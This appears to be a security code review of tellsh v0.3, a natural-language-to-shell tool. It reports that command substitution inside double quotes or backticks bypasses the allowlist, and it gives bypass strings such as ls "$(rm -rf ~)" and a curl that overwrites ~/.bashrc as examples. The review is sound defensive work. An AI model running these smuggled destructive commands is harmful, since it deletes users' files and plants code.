**Final review of tellsh v0.3 (`0d87457..HEAD`)**

I found one Major problem, in the allowlist risk checker. The placeholder rule held in every case I tried. All 392 tests pass.

### Major

**`src/danger.js:24-63` (`simpleCommands`), used by `allowlistProblems` at `src/danger.js:685`: command substitution inside double quotes, or in unquoted backticks, is never checked.**

The double-quote branch adds the text of `$(…)` and `` `…` `` to the word as if it were plain text. A bare backtick is never treated as a separator either. The program inside the substitution therefore never reaches the allowlist, and for `rm` it skips the deny rules too:

| command | risk shown |
|---|---|
| `ls "$(rm -rf ~)"` | safe |
| `ls "$(npx evil)"` | safe |
| `ls "$(curl x -o ~/.bashrc)"` | safe |
| `` ls "`rm -rf ~`" `` | safe |
| `` ls `npx evil` `` | safe |

Unquoted `$(…)` is caught, because `(` splits the command. Unquoted `` `rm -rf ~` `` only got high by accident, because `-rf` is an unknown option for `ls`.

**How it's reached:** through the edit step at the prompt (`src/cli.js:229-237`). The edited command is re-checked with `checkDanger`, comes back `risk: safe`, and a plain Enter runs it with no "yes" step. That breaks rule 2, which says an unknown program needs an explicit "yes". The edit step is exactly where the allowlist does its work, since catalog output already passes it by construction.

**How it's not reached:** generated commands can't produce this. Slot values are single-quoted (`du -sh '$(rm -rf ~)'`, `wc -l 'a$(curl evil)b.txt'`), and history references with such commands are refused. `--yes` only runs catalog output.

**Fix:** treat any `$(`, `` ` `` or `<(`/`>(` outside single quotes as high risk ("runs a command substitution; not on the allowlist"), or pass the substitution body back into `checkDanger`.

### What held up

**Rule 1 (placeholders):** every uncertain gh/wrangler argument I tried became a placeholder, and placeholders are added to `missing`. So `--yes` refuses to run them, the prompt only offers "edit" or "abort", and after an edit the `<[A-Z_]+>` check still blocks running. The checked cases were:
- competing values ("45 or 46", "45 no wait 46", "4 5")
- excluded environments ("but not to production", "to staging, not production", "to prod not staging")
- several environments named ("staging then production")
- unknown words ("preview2", "staging2", "localhost:8787", "the second pr", "forty five")

Explicit values stay as typed: `--env prod-eu`, `env=staging`, `--repo acme/app`, and "pr 45 into main" gives `gh pr merge 45`.

**Rule 2 (allowlist):** `sudo`, `nohup`, `eval`, `IFS=… cmd`, `npx <unknown>`, unknown git/gh subcommands and unknown flags all come back high. So do `git push +ref`/`:ref`, `ssh` with a remote command, and `<(…)` with `rm`.

### Wrong commands that aren't silent (not blocking)

These pick the wrong command, but each is either visible or harmless:
- "delete secret API_KEY" gives `rm API_KEY`. It is flagged high and needs "yes".
- "delete the worker" gives `npx wrangler deploy <ARGS>`. The placeholder blocks running.
- "rerun failed run 123" gives `gh run view 123`, which only reads.

VERDICT: REQUEST_CHANGES
